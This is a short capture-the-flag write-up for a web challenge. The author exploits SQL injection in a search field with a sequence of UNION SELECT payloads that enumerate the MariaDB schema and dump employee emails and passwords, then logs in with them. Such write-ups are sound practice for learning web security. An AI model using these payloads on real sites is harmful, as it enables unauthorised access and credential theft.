# Challenges:

Log into BapeMusic to get the something...

FLAG Format: EHC{XXX}

# Solution:

They give me a nice looking website with 3 function Search, Sign up, Log in.

After sign up they told the sign up function not avalible, the Log in can't exploit anything because they filter all the symbol for sql injection. We only have last option is the search. I enter some "Entry point dection" symbol and found something at `"`:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/6b72b69c-4671-4912-9899-4bc003ed43d1)

MariaDB is very usefull and try a round with basic query and when trying this query `" UNION SELECT @@version; -- -`, i got:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/dc6a86eb-6b0d-46c9-bc43-6ffd67628c58)

Now, i know what i'm going to to. First check the number of columns and an error at column 5 so it has 4 columns `" ODER BY 5; -- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/a00e51f2-c92e-43a0-94a6-872b6e9c06f4)

Get database name: `" UNION SELECT @@version,database(),3,4; -- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/d82360c5-807a-4c56-b913-ad788c4a23fa)

Discover the `sqlinjection` database: `" UNION select TABLE_NAME,TABLE_SCHEMA,3,4 from INFORMATION_SCHEMA.TABLES where table_schema='sqlinjection'-- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/e3be976e-324c-481a-87d9-4bf6c8b94625)

Discorver the `employee` table: `" UNION select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.COLUMNS where table_name='employee'-- -` and we saw some interesting column:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/327a816c-9690-44aa-85b0-0ac22b6adc54)

Get in there to see data: `" UNION select Email, Password,3,4 from employee -- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/a272a556-e2b5-4cce-94b7-284c5b40a1ca)

Siuuuuu. We got the username and password. Now try to login

![1st](https://github.com/Katsumi1012/CTF/assets/90083485/4348cbd7-a9de-4a4d-9891-0df313740a2d)

Get the flag 🚩

# Enjoy 🤡
